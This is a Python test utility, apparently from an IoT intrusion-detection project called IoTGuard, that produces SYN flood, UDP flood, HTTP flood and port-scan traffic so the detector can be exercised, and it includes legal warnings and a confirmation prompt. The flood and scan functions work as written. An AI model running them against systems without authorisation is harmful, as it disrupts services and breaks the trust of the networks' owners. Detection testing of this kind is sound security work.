#!/usr/bin/env python3
"""
scripts/attack_simulator.py
=============================================================================
IoTGuard Test Utility — Controlled Attack Traffic Generator

PURPOSE:
    Generate controlled network traffic patterns that mimic various attack types
    for testing and demonstrating IoTGuard's detection capabilities.

IMPORTANT LEGAL NOTICE:
    ⚠️  This script is for EDUCATIONAL and TESTING purposes ONLY.
    ⚠️  Only use on networks and systems YOU OWN or have EXPLICIT PERMISSION to test.
    ⚠️  Unauthorized use against systems you don't own is ILLEGAL.

USAGE:
    Run from the ATTACKING laptop, targeting the laptop running IoTGuard:
    
    # SYN Flood simulation
    python attack_simulator.py --target 192.168.1.100 --attack syn_flood --duration 30
    
    # Port scan simulation  
    python attack_simulator.py --target 192.168.1.100 --attack port_scan --duration 20
    
    # HTTP flood simulation
    python attack_simulator.py --target 192.168.1.100 --attack http_flood --duration 30

REQUIREMENTS:
    pip install scapy

ARCHITECTURE:
    [Attacker Laptop]                    [IoTGuard Laptop]
    attack_simulator.py  ─────────────►  Suricata/tcpdump
                                              │
                                              ▼
                                        suricata_to_features.py
                                              │
                                              ▼
                                        data/features.csv
                                              │
                                              ▼
                                        decision_loop.py
                                              │
                                              ▼
                                        Dashboard shows ATTACK!
=============================================================================
"""

import argparse
import random
import socket
import struct
import sys
import time
import threading
from typing import Optional

# Check for Scapy (optional but recommended)
SCAPY_AVAILABLE = False
try:
    from scapy.all import IP, TCP, UDP, ICMP, Raw, send, RandShort
    SCAPY_AVAILABLE = True
except ImportError:
    pass


def print_banner():
    """Display warning banner."""
    print("=" * 70)
    print("IoTGuard Attack Simulator - FOR TESTING ONLY".center(70))
    print("=" * 70)
    print()
    print("⚠️  WARNING: Only use on systems you OWN or have permission to test!")
    print("⚠️  Unauthorized use is ILLEGAL and unethical.")
    print()
    print("-" * 70)


# =============================================================================
# ATTACK SIMULATIONS (Using Scapy)
# =============================================================================

def syn_flood_scapy(target_ip: str, target_port: int, duration: int, rate: int):
    """
    SYN Flood attack simulation using Scapy.
    
    WHAT IT DOES:
        Sends TCP SYN packets without completing the handshake.
        This is a classic DDoS technique that exhausts server resources.
    
    WHAT IOTGUARD SHOULD DETECT:
        - High syn_ratio (approaching 1.0)
        - Many flows with few packets per flow
        - Low ack_ratio, fin_ratio
    """
    print(f"\n🔴 Starting SYN Flood -> {target_ip}:{target_port}")
    print(f"   Duration: {duration}s, Rate: ~{rate} packets/sec")
    print("   Press Ctrl+C to stop early\n")
    
    start_time = time.time()
    packet_count = 0
    delay = 1.0 / rate if rate > 0 else 0
    
    try:
        while time.time() - start_time < duration:
            # Randomize source port for each packet
            src_port = random.randint(1024, 65535)
            
            # Create SYN packet
            packet = IP(dst=target_ip) / TCP(
                sport=src_port,
                dport=target_port,
                flags="S",  # SYN flag only
                seq=random.randint(0, 4294967295)
            )
            
            send(packet, verbose=False)
            packet_count += 1
            
            if packet_count % 100 == 0:
                elapsed = time.time() - start_time
                print(f"   Sent {packet_count} packets ({elapsed:.1f}s elapsed)")
            
            if delay > 0:
                time.sleep(delay)
                
    except KeyboardInterrupt:
        print("\n   Stopped by user")
    
    print(f"\n✓ SYN Flood complete: {packet_count} packets sent")
    return packet_count


def port_scan_scapy(target_ip: str, start_port: int, end_port: int, duration: int):
    """
    Port Scan simulation using Scapy.
    
    WHAT IT DOES:
        Scans a range of ports to discover open services.
        Each port gets a SYN probe.
    
    WHAT IOTGUARD SHOULD DETECT:
        - High protocol_diversity
        - Many unique destination ports
        - High rst_ratio (from closed ports)
    """
    print(f"\n🔵 Starting Port Scan -> {target_ip}:{start_port}-{end_port}")
    print(f"   Duration limit: {duration}s")
    print("   Press Ctrl+C to stop early\n")
    
    start_time = time.time()
    scanned = 0
    
    try:
        for port in range(start_port, end_port + 1):
            if time.time() - start_time > duration:
                print("   Duration limit reached")
                break
                
            packet = IP(dst=target_ip) / TCP(
                sport=RandShort(),
                dport=port,
                flags="S"
            )
            send(packet, verbose=False)
            scanned += 1
            
            if scanned % 50 == 0:
                print(f"   Scanned {scanned} ports...")
            
            # Small delay to avoid overwhelming
            time.sleep(0.01)
            
    except KeyboardInterrupt:
        print("\n   Stopped by user")
    
    print(f"\n✓ Port Scan complete: {scanned} ports scanned")
    return scanned


def udp_flood_scapy(target_ip: str, target_port: int, duration: int, rate: int):
    """
    UDP Flood simulation using Scapy.
    
    WHAT IT DOES:
        Floods target with UDP packets (often used in amplification attacks).
    
    WHAT IOTGUARD SHOULD DETECT:
        - Low tcp_ratio (high UDP)
        - High bytes_total and pkts_total
        - Low syn_ratio, ack_ratio (no TCP handshake)
    """
    print(f"\n🟡 Starting UDP Flood -> {target_ip}:{target_port}")
    print(f"   Duration: {duration}s, Rate: ~{rate} packets/sec")
    print("   Press Ctrl+C to stop early\n")
    
    start_time = time.time()
    packet_count = 0
    delay = 1.0 / rate if rate > 0 else 0
    
    # Random payload
    payload = Raw(load="X" * random.randint(64, 1024))
    
    try:
        while time.time() - start_time < duration:
            packet = IP(dst=target_ip) / UDP(
                sport=random.randint(1024, 65535),
                dport=target_port
            ) / payload
            
            send(packet, verbose=False)
            packet_count += 1
            
            if packet_count % 100 == 0:
                elapsed = time.time() - start_time
                print(f"   Sent {packet_count} packets ({elapsed:.1f}s elapsed)")
            
            if delay > 0:
                time.sleep(delay)
                
    except KeyboardInterrupt:
        print("\n   Stopped by user")
    
    print(f"\n✓ UDP Flood complete: {packet_count} packets sent")
    return packet_count


def http_flood_socket(target_ip: str, target_port: int, duration: int, rate: int):
    """
    HTTP Flood simulation using sockets (works without Scapy).
    
    WHAT IT DOES:
        Sends many HTTP GET requests to overwhelm a web server.
    
    WHAT IOTGUARD SHOULD DETECT:
        - High http_ratio
        - Normal tcp_ratio
        - High flows count
    """
    print(f"\n🟢 Starting HTTP Flood -> {target_ip}:{target_port}")
    print(f"   Duration: {duration}s, Rate: ~{rate} requests/sec")
    print("   Press Ctrl+C to stop early\n")
    
    start_time = time.time()
    request_count = 0
    failed = 0
    delay = 1.0 / rate if rate > 0 else 0
    
    http_request = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {target_ip}\r\n"
        f"User-Agent: IoTGuard-Test/1.0\r\n"
        f"Accept: */*\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()
    
    try:
        while time.time() - start_time < duration:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((target_ip, target_port))
                sock.send(http_request)
                sock.close()
                request_count += 1
            except (socket.error, socket.timeout):
                failed += 1
            
            if (request_count + failed) % 50 == 0:
                elapsed = time.time() - start_time
                print(f"   Sent {request_count} requests, {failed} failed ({elapsed:.1f}s)")
            
            if delay > 0:
                time.sleep(delay)
                
    except KeyboardInterrupt:
        print("\n   Stopped by user")
    
    print(f"\n✓ HTTP Flood complete: {request_count} requests sent, {failed} failed")
    return request_count


# =============================================================================
# SOCKET-BASED FALLBACK (No Scapy required)
# =============================================================================

def syn_flood_socket(target_ip: str, target_port: int, duration: int, rate: int):
    """
    SYN Flood using raw sockets (fallback if Scapy not available).
    NOTE: Requires administrator/root privileges.
    """
    print(f"\n🔴 Starting SYN Flood (socket mode) -> {target_ip}:{target_port}")
    print("   NOTE: This requires administrator privileges")
    
    try:
        # Create raw socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except PermissionError:
        print("\n❌ Error: Raw sockets require administrator privileges!")
        print("   Run as Administrator (Windows) or with sudo (Linux)")
        return 0
    except Exception as e:
        print(f"\n❌ Error creating raw socket: {e}")
        return 0
    
    start_time = time.time()
    packet_count = 0
    delay = 1.0 / rate if rate > 0 else 0
    
    try:
        while time.time() - start_time < duration:
            src_port = random.randint(1024, 65535)
            
            # Build IP header
            ip_header = build_ip_header("0.0.0.0", target_ip)
            # Build TCP header with SYN flag
            tcp_header = build_tcp_header(src_port, target_port, target_ip)
            
            packet = ip_header + tcp_header
            sock.sendto(packet, (target_ip, 0))
            packet_count += 1
            
            if packet_count % 100 == 0:
                print(f"   Sent {packet_count} packets...")
            
            if delay > 0:
                time.sleep(delay)
                
    except KeyboardInterrupt:
        print("\n   Stopped by user")
    finally:
        sock.close()
    
    print(f"\n✓ Complete: {packet_count} packets sent")
    return packet_count


def build_ip_header(src_ip: str, dst_ip: str) -> bytes:
    """Build a basic IP header."""
    version_ihl = (4 << 4) + 5
    tos = 0
    total_length = 40  # IP header (20) + TCP header (20)
    identification = random.randint(1, 65535)
    flags_offset = 0
    ttl = 64
    protocol = socket.IPPROTO_TCP
    checksum = 0
    
    src_addr = socket.inet_aton(src_ip) if src_ip != "0.0.0.0" else b'\x00\x00\x00\x00'
    dst_addr = socket.inet_aton(dst_ip)
    
    header = struct.pack(
        '!BBHHHBBH4s4s',
        version_ihl, tos, total_length, identification,
        flags_offset, ttl, protocol, checksum,
        src_addr, dst_addr
    )
    return header


def build_tcp_header(src_port: int, dst_port: int, dst_ip: str) -> bytes:
    """Build a TCP header with SYN flag."""
    seq = random.randint(0, 4294967295)
    ack_seq = 0
    offset_reserved = (5 << 4) + 0
    flags = 0x02  # SYN flag
    window = socket.htons(5840)
    checksum = 0
    urgent_ptr = 0
    
    header = struct.pack(
        '!HHLLBBHHH',
        src_port, dst_port, seq, ack_seq,
        offset_reserved, flags, window, checksum, urgent_ptr
    )
    return header


# =============================================================================
# MAIN
# =============================================================================

def main():
    print_banner()
    
    parser = argparse.ArgumentParser(
        description="IoTGuard Attack Simulator - For Testing Only",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python attack_simulator.py --target 192.168.1.100 --attack syn_flood
  python attack_simulator.py --target 192.168.1.100 --attack port_scan --duration 20
  python attack_simulator.py --target 192.168.1.100 --attack http_flood --port 80
  python attack_simulator.py --target 192.168.1.100 --attack udp_flood --rate 50
        """
    )
    
    parser.add_argument("--target", "-t", required=True,
                        help="Target IP address (YOUR OWN test machine)")
    parser.add_argument("--port", "-p", type=int, default=80,
                        help="Target port (default: 80)")
    parser.add_argument("--attack", "-a", required=True,
                        choices=["syn_flood", "port_scan", "udp_flood", "http_flood"],
                        help="Attack type to simulate")
    parser.add_argument("--duration", "-d", type=int, default=30,
                        help="Duration in seconds (default: 30)")
    parser.add_argument("--rate", "-r", type=int, default=100,
                        help="Packets/requests per second (default: 100)")
    
    args = parser.parse_args()
    
    print(f"Target:   {args.target}:{args.port}")
    print(f"Attack:   {args.attack}")
    print(f"Duration: {args.duration}s")
    print(f"Rate:     {args.rate}/sec")
    print()
    
    # Confirmation prompt
    confirm = input("Are you testing on YOUR OWN system? (yes/no): ").strip().lower()
    if confirm != "yes":
        print("\n❌ Aborted. Only test on systems you own!")
        sys.exit(1)
    
    # Run the selected attack
    if args.attack == "syn_flood":
        if SCAPY_AVAILABLE:
            syn_flood_scapy(args.target, args.port, args.duration, args.rate)
        else:
            print("⚠️  Scapy not installed, using socket fallback (requires admin)")
            syn_flood_socket(args.target, args.port, args.duration, args.rate)
            
    elif args.attack == "port_scan":
        if SCAPY_AVAILABLE:
            port_scan_scapy(args.target, 1, 1024, args.duration)
        else:
            print("❌ Port scan requires Scapy. Install with: pip install scapy")
            
    elif args.attack == "udp_flood":
        if SCAPY_AVAILABLE:
            udp_flood_scapy(args.target, args.port, args.duration, args.rate)
        else:
            print("❌ UDP flood requires Scapy. Install with: pip install scapy")
            
    elif args.attack == "http_flood":
        # HTTP flood works without Scapy
        http_flood_socket(args.target, args.port, args.duration, args.rate)
    
    print("\n" + "=" * 70)
    print("Done! Check your IoTGuard dashboard for detection results.")
    print("=" * 70)


if __name__ == "__main__":
    main()
